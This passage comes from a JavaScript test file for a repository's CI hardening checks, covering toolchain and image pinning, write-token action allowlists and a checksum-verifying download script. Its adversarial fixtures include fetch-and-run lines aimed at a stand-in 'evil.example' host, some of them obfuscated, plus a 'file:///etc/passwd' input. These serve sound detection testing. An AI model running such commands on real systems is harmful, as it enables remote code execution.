  const channel = readRustToolchainChannel();
  assert.deepEqual(allRustOverrideViolations(repoFiles(), channel), []);
});

// ---- fixtures: each override/mismatch kind above must actually be caught ----

test("fixtures: the strict rust-toolchain.toml parser fails closed on unexpected shape", () => {
  assert.throws(() => parseToolchainToml('[toolchain]\nchannel = stable\n'), /quoted string/);
  assert.throws(() => parseToolchainToml('[toolchain]\nchannel = "stable"\nextra = 1\n'), /unexpected key/);
  assert.throws(() => parseToolchainToml('[toolchain]\n[toolchain]\nchannel = "1.99.1"\n'), /more than one/);
  assert.throws(() => parseToolchainToml('channel = "1.99.1"\n'), /no \[toolchain\]/);
  assert.throws(() => parseToolchainToml('[toolchain]\ncomponents = [rustfmt]\nchannel = "1.99.1"\n'), /flat array/);
  assert.throws(() => parseToolchainToml('[toolchain]\nprofile = minimal\nchannel = "1.99.1"\n'), /quoted string/);
  assert.doesNotThrow(() => parseToolchainToml('[toolchain]\nchannel = "1.99.1"\ncomponents = ["rustfmt", "clippy"]\n'));
});

test("fixtures: mismatched Rust build-stage versions and digests across Dockerfiles are caught", () => {
  const stageIn = (file, ref) => parseDockerfileRustStages(file, `FROM mirror.gcr.io/library/rust:${ref} AS build\n`);
  const a = stageIn("A/Dockerfile", `1.99.1-bookworm@sha256:${"a".repeat(64)}`);
  const sameVersionDiffDigest = stageIn("B/Dockerfile", `1.99.1-bookworm@sha256:${"b".repeat(64)}`);
  const wrongVersion = stageIn("C/Dockerfile", `1.98.0-bookworm@sha256:${"a".repeat(64)}`);
  assert.equal(rustVersionViolations([...a, ...sameVersionDiffDigest], "1.99.1").length, 1, "same version, different digest must be caught");
  assert.equal(rustVersionViolations([...a, ...wrongVersion], "1.99.1").length, 1, "wrong version must be caught");
  assert.equal(rustVersionViolations([...a], "1.99.1").length, 0, "one matching stage passes");
  assert.equal(rustVersionViolations([...a, ...stageIn("B/Dockerfile", `1.99.1-bookworm@sha256:${"a".repeat(64)}`)], "1.99.1").length, 0, "two Dockerfiles pinning the identical tag and digest pass");
});

test("fixtures: a Rust image reference in any form (bare, floating tag, undigested, --platform, ARG-substituted) is caught", () => {
  const channel = "1.99.1";
  const digest = "a".repeat(64);
  const stagesOf = text => parseDockerfileRustStages("fixture/Dockerfile", text);

  assert.equal(rustVersionViolations(stagesOf(`FROM rust:1.98.0-bookworm@sha256:${digest} AS build\n`), channel).length, 1, "bare rust: (no registry prefix) wrong version");
  assert.equal(rustVersionViolations(stagesOf(`FROM mirror.gcr.io/library/rust:stable-bookworm@sha256:${digest} AS build\n`), channel).length, 1, "digest-pinned but floating stable-bookworm tag");
  assert.equal(rustVersionViolations(stagesOf("FROM rust:1.99.1-bookworm AS build\n"), channel).length, 1, "correct version with no digest at all");
  assert.equal(rustVersionViolations(stagesOf(`FROM --platform=linux/amd64 rust:1.98.0-bookworm@sha256:${digest} AS build\n`), channel).length, 1, "--platform= flag must not hide the image");
  assert.equal(rustVersionViolations(stagesOf(`FROM --platform=linux/amd64 rust:1.99.1-bookworm@sha256:${digest} AS build\n`), channel).length, 0, "--platform= flag with a correct pin still passes");
  assert.equal(rustVersionViolations(stagesOf(`ARG RUST_IMAGE=rust:1.98.0-bookworm@sha256:${digest}\nFROM \${RUST_IMAGE} AS build\n`), channel).length, 1, "ARG-substituted wrong version");
  assert.deepEqual(rustVersionViolations(stagesOf(`ARG RUST_IMAGE=rust:1.99.1-bookworm@sha256:${digest}\nFROM \${RUST_IMAGE} AS build\n`), channel), [], "ARG-substituted correct pin passes");
  assert.deepEqual(rustVersionViolations(stagesOf(`FROM mirror.gcr.io/library/rust:1.99.1-bookworm@sha256:${digest} AS build\n`), channel), [], "correctly pinned mirrored reference passes");
  assert.equal(stagesOf("FROM gcr.io/distroless/cc-debian12:nonroot@sha256:" + digest + "\n").length, 0, "a non-rust base image is not treated as a rust stage");
});

test("fixtures: a job container, a service image, or an image in a CI-invoked compose file is checked against the pin", () => {
  const channel = "1.99.1";
  const digest = "a".repeat(64);
  const dataOf = text => toData(parseStrict(text, "fixture.yml"));
  const job = body => `name: f\non: push\njobs:\n  j:\n    runs-on: ubuntu-24.04\n${body}    steps:\n      - run: echo hi\n`;

  let stages = rustStagesFromWorkflowContainers("fixture.yml", dataOf(job("    container: rust:1.98.0\n")));
  assert.equal(rustVersionViolations(stages, channel).length, 2, "container: bare string, wrong version and no digest at all");

  stages = rustStagesFromWorkflowContainers("fixture.yml", dataOf(job("    container:\n      image: mirror.gcr.io/library/rust:stable\n")));
  assert.equal(rustVersionViolations(stages, channel).length, 1, "container.image object, floating tag");

  stages = rustStagesFromWorkflowContainers("fixture.yml", dataOf(job(`    services:\n      rustsvc:\n        image: rust:1.98.0-bookworm@sha256:${digest}\n`)));
  assert.equal(rustVersionViolations(stages, channel).length, 1, "services.<name>.image, wrong version");

  stages = rustStagesFromWorkflowContainers("fixture.yml", dataOf(job(`    container: mirror.gcr.io/library/rust:1.99.1-bookworm@sha256:${digest}\n`)));
  assert.deepEqual(rustVersionViolations(stages, channel), [], "correctly pinned container: passes");

  const script = `docker compose -f deploy/fixture/compose.yaml up -d\ncurl http://localhost:8080\n`;
  assert.deepEqual(composeFilesReferencedIn(script), ["deploy/fixture/compose.yaml"]);
  assert.deepEqual(composeFilesReferencedIn("echo no compose here\n"), []);
  const composeText = `services:\n  build:\n    image: rust:1.98.0-bookworm@sha256:${digest}\n`;
  const composeStages = rustImagesInCompose("deploy/fixture/compose.yaml", composeText);
  assert.equal(rustVersionViolations(composeStages, channel).length, 1, "compose service image, wrong version");
  const goodComposeText = `services:\n  build:\n    image: mirror.gcr.io/library/rust:1.99.1-bookworm@sha256:${digest}\n`;
  assert.deepEqual(rustVersionViolations(rustImagesInCompose("deploy/fixture/compose.yaml", goodComposeText), channel), [], "correctly pinned compose image passes");
});

test("fixtures: an untagged container: rust or a digest-only rust ref does not bypass the pin check (#354 review)", () => {
  const channel = "1.99.1";
  const digest = "a".repeat(64);
  const dataOf = text => toData(parseStrict(text, "fixture.yml"));
  const job = body => `name: f\non: push\njobs:\n  j:\n    runs-on: ubuntu-24.04\n${body}    steps:\n      - run: echo hi\n`;

  let stages = rustStagesFromWorkflowContainers("fixture.yml", dataOf(job("    container: rust\n")));
  assert.equal(stages.length, 1, "bare untagged 'container: rust' must be recognized as a rust image");
  assert.ok(rustVersionViolations(stages, channel).length > 0, "untagged container: rust must not bypass the pin check");

  stages = rustStagesFromWorkflowContainers("fixture.yml", dataOf(job(`    container: rust@sha256:${digest}\n`)));
  assert.equal(stages.length, 1, "digest-only 'rust@sha256:...' must be recognized as a rust image");
  assert.ok(rustVersionViolations(stages, channel).length > 0, "digest-only rust ref without a version tag must not bypass the pin check");

  stages = rustStagesFromWorkflowContainers("fixture.yml", dataOf(job(`    container: mirror.gcr.io/library/rust@sha256:${digest}\n`)));
  assert.equal(stages.length, 1, "registry-prefixed digest-only rust ref must be recognized as a rust image");
  assert.ok(rustVersionViolations(stages, channel).length > 0, "registry-prefixed digest-only rust ref must not bypass the pin check");

  stages = rustStagesFromWorkflowContainers("fixture.yml", dataOf(job(`    container: mirror.gcr.io/library/rust:${channel}-bookworm@sha256:${digest}\n`)));
  assert.deepEqual(rustVersionViolations(stages, channel), [], "correctly pinned container: still passes");
});

test("fixtures: an indented or lowercase FROM line is still recognized as a rust stage (#354 review)", () => {
  const channel = "1.99.1";
  const digest = "a".repeat(64);
  const stagesOf = text => parseDockerfileRustStages("fixture/Dockerfile", text);

  let stages = stagesOf(`  FROM rust:1.98.0-bookworm@sha256:${digest} AS build\n`);
  assert.equal(stages.length, 1, "indented FROM line must be recognized as a rust stage");
  assert.ok(rustVersionViolations(stages, channel).length > 0, "indented, wrongly pinned FROM must not bypass the pin check");

  stages = stagesOf(`from rust:1.98.0-bookworm@sha256:${digest} as build\n`);
  assert.equal(stages.length, 1, "lowercase from line must be recognized as a rust stage");
  assert.ok(rustVersionViolations(stages, channel).length > 0, "lowercase from, wrongly pinned, must not bypass the pin check");

  stages = stagesOf(`\tFROM mirror.gcr.io/library/rust:${channel}-bookworm@sha256:${digest} AS build\n`);
  assert.deepEqual(rustVersionViolations(stages, channel), [], "indented, correctly pinned FROM still passes");
});

test("fixtures: every docker compose -f/--file form, and every file argument, is parsed (#354 review)", () => {
  assert.deepEqual(composeFilesReferencedIn("docker compose --file=compose.yaml up -d\n"), ["compose.yaml"], "--file=path form");
  assert.deepEqual(composeFilesReferencedIn("docker compose -f=compose.yaml up -d\n"), ["compose.yaml"], "-f=path form");
  assert.deepEqual(composeFilesReferencedIn("docker compose --file compose.yaml up -d\n"), ["compose.yaml"], "--file path form");
  assert.deepEqual(
    [...composeFilesReferencedIn("docker compose -f a.yaml -f b.yaml up -d\n")].sort(),
    ["a.yaml", "b.yaml"],
    "multiple -f arguments on one invocation must all be checked"
  );
});

test("fixtures: duplicate keys and duplicate [toolchain] tables in rust-toolchain.toml are rejected", () => {
  assert.throws(() => parseToolchainToml('[toolchain]\nchannel = "1.99.1"\nchannel = "1.98.0"\n'), /duplicate key/);
  assert.throws(() => parseToolchainToml('[toolchain]\ncomponents = ["rustfmt"]\ncomponents = ["clippy"]\nchannel = "1.99.1"\n'), /duplicate key/);
  assert.throws(() => parseToolchainToml('[toolchain]\nchannel = "1.99.1"\n[toolchain]\nchannel = "1.99.1"\n'), /more than one/);
});

test("fixtures: Rust toolchain overrides are caught, without false-positiving on unrelated 'stable' tags", () => {
  const channel = "1.99.1";
  const SHA1 = "a".repeat(40);
  const wf = steps => [{ file: "fixture.yml", text: `name: f\non: push\njobs:\n  j:\n    runs-on: ubuntu-24.04\n    steps:\n${steps}` }];

  assert.equal(allRustOverrideViolations(wf(`      - run: echo hi\n        env:\n          RUSTUP_TOOLCHAIN: stable\n`), channel).length, 1, "RUSTUP_TOOLCHAIN env");
  assert.equal(allRustOverrideViolations(wf(`      - run: rustup default stable\n`), channel).length, 1, "rustup default");
  assert.equal(allRustOverrideViolations(wf(`      - run: rustup toolchain install nightly\n`), channel).length, 1, "rustup toolchain install");
  assert.equal(allRustOverrideViolations(wf(`      - run: rustup override set beta\n`), channel).length, 1, "rustup override set");
  assert.equal(allRustOverrideViolations(wf(`      - run: cargo +nightly test\n`), channel).length, 1, "cargo +toolchain");
  assert.equal(allRustOverrideViolations(wf(`      - uses: dtolnay/rust-toolchain@${SHA1} # stable\n        with:\n          toolchain: stable\n`), channel).length, 1, "floating toolchain input");
  assert.equal(allRustOverrideViolations(wf(`      - uses: dtolnay/rust-toolchain@${SHA1} # 1.98.0\n        with:\n          toolchain: "1.98.0"\n`), channel).length, 1, "wrong exact toolchain input");
  // Correctly pinned, and unrelated commands/tags, must not false-positive.
  assert.deepEqual(allRustOverrideViolations(wf(`      - uses: dtolnay/rust-toolchain@${SHA1} # 1.99.1\n        with:\n          toolchain: "1.99.1"\n`), channel), []);
  assert.deepEqual(allRustOverrideViolations(wf(`      - run: echo hi\n`), channel), []);
  assert.deepEqual(allRustOverrideViolations(wf(`      - uses: docker/setup-buildx-action@${SHA1} # v4\n        with:\n          driver-opts: image=mirror.gcr.io/moby/buildkit:buildx-stable-1@sha256:${"c".repeat(64)}\n`), channel), []);
});

test("jobs that can write use only allowlisted actions (#194)", () => {
  assert.deepEqual(allWriteViolations(repoFiles(), readLocalFromRepo), []);
});

test("every allowlisted write-job action is used by a write job", () => {
  // Remove an action from the list when nothing needs it any more: take it out of
  // the allowlist, run the check above, and see what fails.
  const unused = [];
  const files = repoFiles();
  for (const name of WRITE_JOB_ACTIONS.keys()) {
    const without = new Map([...WRITE_JOB_ACTIONS].filter(([k]) => k !== name));
    if (allWriteViolations(files, readLocalFromRepo, without).length === 0) unused.push(name);
  }
  assert.deepEqual(unused, [], "remove allowlist entries no write job uses");
});

test("setup-buildx-action never downloads Buildx next to a write token", () => {
  const files = repoFiles().filter(f => f.file.includes("workflows/"));
  assert.ok(files.length);
  assert.deepEqual(files.flatMap(({ file, text }) => buildxViolations(file, text)), []);
});

test("no workflow uses an installer that downloads a tool without a pinned checksum", () => {
  const found = [];
  for (const { file, text } of repoFiles()) {
    const data = toData(parseStrict(text, file));
    const refs = [...jobsOf(data).flatMap(([, job]) => [job.uses, ...stepsOf(job).map(s => s.uses)]), ...stepsOf(data.runs).map(s => s.uses)];
    for (const ref of refs.filter(r => typeof r === "string")) {
      const why = UNVERIFIED_INSTALLERS.get(actionName(ref));
      if (why) found.push(`${file}: ${ref}: ${why}`);
    }
  }
  assert.deepEqual(found, []);
});

test("every run-time download goes through fetch-verified.sh with a literal URL and checksum", () => {
  const found = [];
  for (const { file, text } of repoFiles()) {
    const data = toData(parseStrict(text, file));
    for (const [where, script] of runScripts(data)) found.push(...downloadViolations(file, script).map(v => `${where}: ${v}`));
  }
  assert.deepEqual(found, []);
  // The download steps exist (a guard against this check going vacuous).
  const calls = repoFiles().filter(f => /fetch-verified\.sh/.test(f.text)).map(f => f.file);
  for (const f of [".github/workflows/image.yml", ".github/workflows/ci.yml", ".github/actions/setup-node/action.yml"]) assert.ok(calls.includes(f), `${f} fetches its tools with the script`);
});

test("taiki-e/install-action installs exact versions with its checksum check on", () => {
  const found = [];
  for (const { file, text } of repoFiles()) {
    const data = toData(parseStrict(text, file));
    for (const [name, job] of jobsOf(data)) {
      for (const step of stepsOf(job)) {
        if (typeof step.uses !== "string" || actionName(step.uses) !== "taiki-e/install-action") continue;
        const tools = String(step.with?.tool ?? "").split(",").map(t => t.trim()).filter(Boolean);
        if (!tools.length || tools.some(t => !/^[\w.-]+@\d+\.\d+\.\d+$/.test(t))) found.push(`${file}: job '${name}' tool '${step.with?.tool}' is not name@x.y.z`);
        if (String(step.with?.checksum ?? "true") !== "true") found.push(`${file}: job '${name}' disables the checksum`);
      }
    }
  }
  assert.deepEqual(found, []);
});

test("vendored advisory coverage supplements the unchanged real-graph scan in its read-only pinned-tool job", () => {
  const data = toData(parseStrict(readLocalFromRepo(".github/workflows/ci.yml"), "ci.yml"));
  const job = data.jobs["cargo-deny"];
  assert.equal(jobCanWrite(data, job), false);
  const steps = stepsOf(job);
  const normal = steps.findIndex(s => s.run === "cargo deny --all-features check");
  const fixtures = steps.findIndex(s => s.run === "node --test tests/vendored-advisories.test.mjs");
  const extra = steps.findIndex(s => s.run === "node .github/scripts/vendored-advisories.mjs");
  const install = steps.findIndex(s => s.with?.tool === "cargo-deny@0.20.2");
  const node = steps.findIndex(s => s.uses === "./.github/actions/setup-node");
  assert.ok(install >= 0 && normal > install && fixtures > normal && extra > fixtures && fixtures > node && node >= 0);
  for (const index of [normal, fixtures, extra, install, node]) {
    assert.equal(steps[index].if, undefined);
    assert.equal(steps[index]["continue-on-error"], undefined);
  }
  for (const index of [fixtures, extra]) {
    assert.ok(steps[index].name, "additional coverage is separately labelled");
    assert.equal(steps[index].env?.CI, undefined, "fixture must not bypass its CI-required scanner");
    assert.equal(steps[index].env?.CARGO_DENY, undefined, "same pinned tool on PATH");
  }
});

// ---- the fetch script ----

function runFetch(args, { curlBody, curlFails = false } = {}) {
  const dir = mkdtempSync(join(tmpdir(), "fetch-verified-"));
  try {
    // A stand-in curl on PATH: records its arguments and "downloads" a local file.
    const stub = join(dir, "bin");
    writeFileSync(join(dir, "args.log"), "");
    const body = join(dir, "body");
    writeFileSync(body, curlBody ?? "payload\n");
    const script = [
      "#!/usr/bin/env bash",
      `printf '%s\\n' "$*" >> '${join(dir, "args.log")}'`,
      curlFails ? "exit 22" : "",
      'out=""; while [ $# -gt 0 ]; do [ "$1" = "--output" ] && out="$2"; shift; done',
      `cp '${body}' "$out"`,
    ].join("\n");
    spawnSync("mkdir", ["-p", stub]);
    writeFileSync(join(stub, "curl"), script);
    chmodSync(join(stub, "curl"), 0o755);
    const dest = join(dir, "out", "tool");
    spawnSync("mkdir", ["-p", join(dir, "out")]);
    const resolved = args.map(a => (a === "DEST" ? dest : a));
    const r = spawnSync("bash", [join(root, FETCH_SCRIPT), ...resolved], { env: { ...process.env, PATH: `${stub}:${process.env.PATH}` }, encoding: "utf8" });
    return { ...r, dest, leftovers: readdirSync(join(dir, "out")), curlArgs: readFileSync(join(dir, "args.log"), "utf8"), cleanup: () => rmSync(dir, { recursive: true, force: true }) };
  } catch (e) {
    rmSync(dir, { recursive: true, force: true });
    throw e;
  }
}

const sha256 = body => spawnSync("bash", ["-c", `printf '%s' "$1" | (sha256sum 2>/dev/null || shasum -a 256) | cut -d' ' -f1`, "_", body], { encoding: "utf8" }).stdout.trim();
const GOOD_URL = "https://example.org/releases/tool.tar.gz";

test("fetch-verified.sh moves a download into place only after the checksum matches", () => {
  const r = runFetch([GOOD_URL, sha256("payload\n"), "DEST"]);
  try {
    assert.equal(r.status, 0, r.stderr);
    assert.equal(readFileSync(r.dest, "utf8"), "payload\n");
    assert.deepEqual(r.leftovers, ["tool"], "no temporary file is left next to the destination");
    for (const flag of ["--proto =https", "--proto-redir =https", "--fail"]) assert.ok(r.curlArgs.includes(flag), `curl gets ${flag}`);
    assert.ok(r.curlArgs.includes(GOOD_URL));
  } finally {
    r.cleanup();
  }
});

test("fetch-verified.sh fails closed on a wrong checksum and leaves nothing at the destination", () => {
  const r = runFetch([GOOD_URL, "0".repeat(64), "DEST"]);
  try {
    assert.notEqual(r.status, 0);
    assert.match(r.stderr, /checksum/i);
    assert.equal(existsSync(r.dest), false);
    assert.deepEqual(r.leftovers, [], "the temporary file is removed too");
  } finally {
    r.cleanup();
  }
});

test("fetch-verified.sh fails closed when the download fails", () => {
  const r = runFetch([GOOD_URL, sha256("payload\n"), "DEST"], { curlFails: true });
  try {
    assert.notEqual(r.status, 0);
    assert.equal(existsSync(r.dest), false);
    assert.deepEqual(r.leftovers, []);
  } finally {
    r.cleanup();
  }
});

test("fetch-verified.sh accepts only an https URL, a 64-hex checksum and three arguments", () => {
  const sum = sha256("payload\n");
  const cases = {
    "http URL": ["http://example.org/x", sum, "DEST"],
    "file URL": ["file:///etc/passwd", sum, "DEST"],
    "ftp URL": ["ftp://example.org/x", sum, "DEST"],
    "option as URL": ["--output=/tmp/x", sum, "DEST"],
    "URL with a space": ["https://example.org/a b", sum, "DEST"],
    "short checksum": [GOOD_URL, sum.slice(0, 63), "DEST"],
    "uppercase checksum": [GOOD_URL, sum.toUpperCase(), "DEST"],
    "no destination": [GOOD_URL, sum],
    "extra argument": [GOOD_URL, sum, "DEST", "more"],
  };
  for (const [name, args] of Object.entries(cases)) {
    const r = runFetch(args);
    try {
      assert.notEqual(r.status, 0, name);
      assert.equal(r.curlArgs, "", `${name}: curl was never called`);
      assert.equal(existsSync(r.dest), false, name);
    } finally {
      r.cleanup();
    }
  }
});

test("fetch-verified.sh refuses to overwrite an existing destination", () => {
  const dir = mkdtempSync(join(tmpdir(), "fetch-verified-"));
  try {
    const dest = join(dir, "tool");
    writeFileSync(dest, "original");
    const r = spawnSync("bash", [join(root, FETCH_SCRIPT), GOOD_URL, sha256("payload\n"), dest], { encoding: "utf8" });
    assert.notEqual(r.status, 0);
    assert.equal(readFileSync(dest, "utf8"), "original");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("no workflow can switch the fetch script into a test mode", () => {
  assert.doesNotMatch(readFileSync(join(root, FETCH_SCRIPT), "utf8"), /\b(FETCH_VERIFIED_|TEST_MODE|ALLOW_INSECURE)/);
});

// ---- adversarial fixtures: the checks must catch these ----

const SHA = n => String(n).repeat(40);
const wf = body => `name: fixture\non: push\n${body}\n`;
const noLocal = () => null;
const violations = (text, readLocal = noLocal) => allWriteViolations([{ file: ".github/workflows/fixture.yml", text }], readLocal);
const localFiles = files => path => files[path] ?? null;

test("fixtures: write-permission bypasses are caught", () => {
  const evil = "aquasecurity/trivy-action@master";
  // flow-style workflow (the reader this replaced skipped it)
  assert.ok(violations(`name: bypass\non: push\npermissions: {packages: write}\njobs: { evil: { runs-on: ubuntu-24.04, steps: [{ uses: ${evil} }] } }\n`).length);
  // an alias supplies the permissions
  assert.ok(violations(wf(`x-perm: &p {packages: write}\npermissions: *p\njobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ${evil}`)).length);
  // an alias supplies the steps, a merge key the whole job
  assert.ok(violations(wf(`x-steps: &s\n  - uses: ${evil}\npermissions: write-all\njobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps: *s`)).length);
  assert.ok(violations(wf(`x-job: &j\n  runs-on: ubuntu-24.04\n  permissions: {packages: write}\n  steps: [{uses: ${evil}}]\njobs:\n  evil:\n    <<: *j`)).length);
  // no permissions anywhere: the repository default token
  assert.ok(violations(wf(`jobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ${evil}`)).length);
  // write-all, at the workflow level and the job level
  assert.ok(violations(wf(`permissions: write-all\njobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ${evil}`)).length);
  assert.ok(violations(wf(`permissions: read-all\njobs:\n  evil:\n    permissions: write-all\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ${evil}`)).length);
  // an empty block is not proof of read-only
  assert.ok(violations(wf(`jobs:\n  evil:\n    permissions:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ${evil}`)).length);
  // docker:// and an external reusable workflow
  assert.ok(violations(wf(`permissions: {contents: read}\njobs:\n  evil:\n    permissions: {packages: write}\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: docker://alpine@sha256:${"a".repeat(64)}`)).length);
  assert.ok(violations(wf(`permissions: {contents: read}\njobs:\n  evil:\n    permissions: {packages: write}\n    uses: other/repo/.github/workflows/x.yml@${SHA(1)}`)).length);
  // a local action path that escapes the repository, or does not exist
  assert.ok(violations(wf(`permissions: {packages: write}\njobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ../outside`)).length);
  assert.ok(violations(wf(`permissions: {packages: write}\njobs:\n  evil:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ./.github/actions/missing`)).length);
});

test("fixtures: an action hidden in a local composite or a called workflow is caught", () => {
  const composite = `name: c\ndescription: d\nruns:\n  using: composite\n  steps:\n    - uses: ./.github/actions/inner\n`;
  const inner = `name: i\ndescription: d\nruns:\n  using: composite\n  steps:\n    - uses: aquasecurity/trivy-action@${SHA(2)} # v1\n`;
  const files = { ".github/actions/outer/action.yml": composite, ".github/actions/inner/action.yml": inner };
  const job = perms => wf(`${perms}\njobs:\n  j:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: ./.github/actions/outer`);
  assert.equal(violations(job("permissions: {packages: write}"), localFiles(files)).length, 1);
  // the same composite is fine where the token is read-only
  assert.equal(violations(job("permissions: {contents: read}"), localFiles(files)).length, 0);
  // a composite of run steps only is fine next to a write token
  const plain = { ".github/actions/outer/action.yml": `name: c\ndescription: d\nruns:\n  using: composite\n  steps:\n    - run: echo hi\n      shell: bash\n` };
  assert.equal(violations(job("permissions: {packages: write}"), localFiles(plain)).length, 0);

  // a reusable workflow inherits what its caller grants
  const callee = `name: callee\non: workflow_call\njobs:\n  scan:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: aquasecurity/trivy-action@${SHA(3)} # v1\n`;
  const caller = grant => wf(`permissions: {contents: read}\njobs:\n  call:\n    permissions: ${grant}\n    uses: ./.github/workflows/callee.yml`);
  const reusable = { ".github/workflows/callee.yml": callee };
  assert.equal(violations(caller("{packages: write, id-token: write}"), localFiles(reusable)).length, 1);
  assert.equal(violations(caller("{contents: read}"), localFiles(reusable)).length, 0);
  // a callee that declares write is capped by a read-only caller
  const greedy = { ".github/workflows/callee.yml": callee.replace("jobs:", "permissions: {packages: write}\njobs:") };
  assert.equal(violations(caller("{contents: read}"), localFiles(greedy)).length, 0);
  assert.equal(violations(caller("{packages: write}"), localFiles(greedy)).length, 1);
});

test("fixtures: ordinary workflows pass", () => {
  const ok = `permissions: {contents: read}\njobs:\n  scan:\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: aquasecurity/trivy-action@${SHA(4)} # v1\n  push:\n    permissions: {contents: read, packages: write}\n    runs-on: ubuntu-24.04\n    steps:\n      - uses: actions/checkout@${SHA(5)} # v1\n      - uses: docker/login-action@${SHA(6)} # v1\n  call:\n    permissions: {packages: write}\n    uses: ./.github/workflows/other.yml\n`;
  assert.equal(violations(wf(ok), localFiles({ ".github/workflows/other.yml": "name: o\non: workflow_call\njobs:\n  a:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo\n" })).length, 0);
});

test("fixtures: the strict reader rejects what it cannot read safely", () => {
  assert.throws(() => parseStrict("name: x\nname: y\n", "dup.yml"), /dup\.yml/);
  assert.throws(() => parseStrict("name: [unclosed\n", "bad.yml"), /bad\.yml/);
  assert.throws(() => parseStrict("- a\n- b\n", "list.yml"), /mapping/);
  const bomb = ["a: &a [x, x, x, x, x, x, x, x, x, x]", ...Array.from("bcdefghij", (c, i) => `${c}: &${c} [${Array(10).fill("*" + "abcdefghi"[i]).join(", ")}]`), "z: [*j, *j, *j, *j, *j, *j, *j, *j, *j, *j]"].join("\n");
  assert.throws(() => toData(parseStrict(bomb, "bomb.yml")));
});

test("fixtures: unpinned references are caught wherever they are written", () => {
  const bad = refs => pinViolations(wf(`jobs:\n  j:\n    steps:\n${refs}`), "fixture.yml").length;
  assert.equal(bad(`      - uses: actions/checkout@v4 # v4`), 1);
  assert.equal(bad(`      - uses: actions/checkout@${SHA(1)}`), 1, "a SHA without a version comment");
  assert.equal(bad(`      - { uses: actions/checkout@${SHA(1)} }`), 1, "flow style cannot carry the comment");
  assert.equal(bad(`      - uses: docker://alpine:3`), 1);
  assert.equal(bad(`      - uses: &u actions/checkout@${SHA(1)} # v1\n      - uses: *u`), 1, "an alias cannot be checked");
  assert.equal(bad(`      - uses: \${{ env.ACTION }}`), 1);
  assert.equal(bad(`      - uses: actions/checkout@${SHA(1)} # v1\n      - uses: docker://alpine@sha256:${"b".repeat(64)}\n      - uses: ./.github/actions/x`), 0);
});

test("fixtures: Buildx downloads next to a write token are caught", () => {
  const job = (perms, steps) => wf(`jobs:\n  j:\n    runs-on: ubuntu-24.04\n    permissions: ${perms}\n    steps:\n${steps}`);
  const setup = extra => `      - uses: docker/setup-buildx-action@${SHA(1)} # v4\n        with:\n          driver-opts: image=mirror.gcr.io/moby/buildkit:v1@sha256:${"c".repeat(64)}\n${extra}`;
  const guard = `      - run: docker buildx version\n`;
  const check = (perms, steps) => buildxViolations("fixture.yml", job(perms, steps)).length;
  assert.equal(check("{packages: write}", setup("")), 1, "no guard step");
  assert.equal(check("{packages: write}", guard + setup("")), 0);
  assert.equal(check("{packages: write}", guard + setup("          version: latest\n")), 1);
  assert.equal(check("{packages: write}", guard + setup("          driver: cloud\n")), 1);
  assert.equal(check("{packages: write}", setup("") + guard), 1, "the guard must come first");
  // Guards that never protect anything (adversarial review of #194).
  assert.equal(check("{packages: write}", `      - if: false\n        run: docker buildx version\n` + setup("")), 1, "conditional guard");
  assert.equal(check("{packages: write}", `      - continue-on-error: true\n        run: docker buildx version\n` + setup("")), 1, "error-ignoring guard");
  assert.equal(check("{packages: write}", `      - run: |\n          if false; then\n          docker buildx version\n          fi\n` + setup("")), 1, "guard inside a dead branch");
  assert.equal(check("{packages: write}", guard + `      - run: echo between\n` + setup("")), 1, "guard not immediately before");
  assert.equal(check("{contents: read}", setup("")), 0, "read-only jobs need no guard");
  assert.equal(check("{contents: read}", `      - uses: docker/setup-buildx-action@${SHA(1)} # v4\n        with:\n          driver-opts: image=moby/buildkit:master\n`), 1, "unpinned BuildKit image");
  assert.equal(check("{contents: read}", `      - uses: docker/setup-buildx-action@${SHA(1)} # v4\n`), 1, "no BuildKit pin");
});

test("fixtures: downloads that skip the checksum script are caught", () => {
  const sum = "a".repeat(64);
  const bad = [
    "curl -fsSL https://example.org/x | sh",
    "curl -fsSL -o x https://example.org/x\necho \"$sum  x\" | sha256sum -c -",
    "# sha256sum -c\ncurl -fsSLO https://example.org/x",
    "wget https://example.org/x",
    "gh release download v1 --repo a/b",
    "gh run download 1",
    "Invoke-WebRequest https://example.org/x -OutFile x",
    "python3 -c 'import urllib.request as u; u.urlopen(\"https://example.org\")'",
    "node -e 'fetch(\"https://example.org\")'",
    "cargo install foo",
    `bash ${FETCH_SCRIPT} "https://example.org/\${VERSION}/x" ${sum} out`,
    `bash ${FETCH_SCRIPT} https://example.org/x "\${SUM}" out`,
    `bash ${FETCH_SCRIPT} http://example.org/x ${sum} out`,
    `bash ${FETCH_SCRIPT} https://example.org/x ${"A".repeat(64)} out`,
    `bash ${FETCH_SCRIPT} https://example.org/x ${sum.slice(1)} out`,
    `bash scripts/fetch-verified.sh https://example.org/x ${sum} out`,
    `bash ${FETCH_SCRIPT} https://example.org/x ${sum} out && curl https://evil.example`,
    // Adversarial review of #194: obfuscation and exemption abuse.
    'client=cu; client+=rl; "$client" https://evil.example/payload | bash',
    "eval 'cu''rl https://evil.example/payload | bash'",
    "curl --fail --silent --show-error --cacert .local/staging/local-ca.crt https://localhost:18443/health/ready --next https://evil.example/payload -o /tmp/payload",
    "x=$(cat payload.b64 | base64 -d); echo ok",
    "source <(echo 'echo hi')",
  ];
  for (const script of bad) assert.ok(downloadViolations("w.yml", script).length, script);
  const good = [
    `bash ${FETCH_SCRIPT} https://example.org/x.tar.gz ${sum} "\${RUNNER_TEMP}/x.tar.gz"`,
    `bash ${FETCH_SCRIPT} "https://example.org/x" "${sum}" out`,
    `case "$ARCH" in\n  X64) bash ${FETCH_SCRIPT} https://example.org/a ${sum} out ;;\n  ARM64) bash ${FETCH_SCRIPT} https://example.org/b ${sum} out ;;\nesac`,
    `bash ${FETCH_SCRIPT} \\\n  https://example.org/x \\\n  ${sum} out`,
    "curl --fail --silent --show-error --cacert .local/staging/local-ca.crt https://localhost:18443/health/ready",
